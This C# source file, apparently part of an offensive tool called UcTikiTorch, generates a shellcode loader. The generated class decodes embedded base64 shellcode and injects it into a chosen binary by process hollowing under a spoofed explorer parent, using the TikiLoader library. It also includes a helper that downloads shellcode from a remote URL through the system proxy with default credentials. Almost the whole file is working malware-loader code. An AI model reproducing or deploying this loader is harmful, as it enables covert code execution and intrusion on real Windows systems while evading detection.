using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UcTikiTorch
{
    class GetCode
    {
        public static string Getcode(string shellcode,string process) {
            return @"using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using TikiLoader;

[ComVisible(true)]
public class TikiSpawn
{
    
    public static void full()
    {
        AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        string shellcode = @"""+shellcode+ @""";
        Flame(@"""+ process + @""", shellcode);
        }

        static System.Reflection.Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            //获取加载失败的程序集的全名
            var assName = new AssemblyName(args.Name).FullName;
            if (args.Name.Contains(""TikiLoader""))
            {
                //读取资源
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""TikiLoader.dll""))
                {
                    var bytes = new byte[stream.Length];
                    stream.Read(bytes, 0, (int)stream.Length);
                    return Assembly.Load(bytes);//加载资源文件中的dll,代替加载失败的程序集
                }
            }
            throw new DllNotFoundException(assName);
        }

        private static byte[] GetShellcode(string url)
        {
            WebClient client = new WebClient();
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string compressedEncodedShellcode = client.DownloadString(url);
            return Generic.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
        }

        public static int FindProcessPid(string process)
        {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] processes = Process.GetProcessesByName(process);

            foreach (Process proc in processes)
            {
                if (proc.SessionId == session)
                {
                    pid = proc.Id;
                }
            }

            return pid;
        }

        public static void Flame(string binary, string shellcode)
        {
            //byte[] shellcode = GetShellcode(url);
            byte[] evalcode = Generic.DecompressShellcode(Convert.FromBase64String(shellcode));
            int ppid = FindProcessPid(""explorer"");

            if (ppid != 0)
            {
                try
                {
                    var hollower = new Hollower();
                    hollower.Hollow(binary, evalcode, ppid);
                }
                catch { }
            }
            else
            {
                Environment.Exit(1);
            }
        }
    }";

        }
    }
}
